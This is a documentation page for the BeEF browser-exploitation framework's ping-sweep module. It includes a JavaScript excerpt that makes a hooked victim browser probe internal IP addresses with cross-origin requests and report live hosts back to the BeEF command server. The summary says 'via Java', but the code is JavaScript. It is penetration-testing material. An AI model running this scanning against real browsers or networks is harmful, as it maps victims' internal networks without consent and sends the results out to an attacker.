## Summary

* **Objective**: Perform a ping sweep of the network via Java
* **Authors**: bcoles
* **Browsers**: Firefox

* [Code](https://github.com/beefproject/beef/tree/master/modules/network/ping_sweep)

## Internal Working

Discover active hosts in the internal network of the hooked browser using JavaScript XHR.

Browser needs to support CORS (Cross Origin Resource Sharing)

Set the IP address range to 'common' to scan a list of common LAN addresses.

The default number of workers (3) should be sufficient. Increasing the number of workers is likely to result in false negatives due to hitting the browser's maximum connection cap.

```js
worker.queue('var start_time = new Date().getTime();' +
      'beef.net.cors.request(' +
        '"GET", "http://'+ip+':'+port+'/", "", '+timeout+', function(response) {' +
          'var current_time = new Date().getTime();' +
          'var duration = current_time - start_time;' +
          'if (duration < '+timeout+') {' +
            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
            'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
          '} else {' +
            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
          '}' +
      '});'
    );
```

## Screenshots

![ping sweep options](https://cloud.githubusercontent.com/assets/434827/14728907/6d5936aa-087c-11e6-9b21-dbdc5d68d3f5.png)

![ping sweep results](https://cloud.githubusercontent.com/assets/434827/14728928/9dd46084-087c-11e6-93a8-44406fc89a11.png)

## Feedback
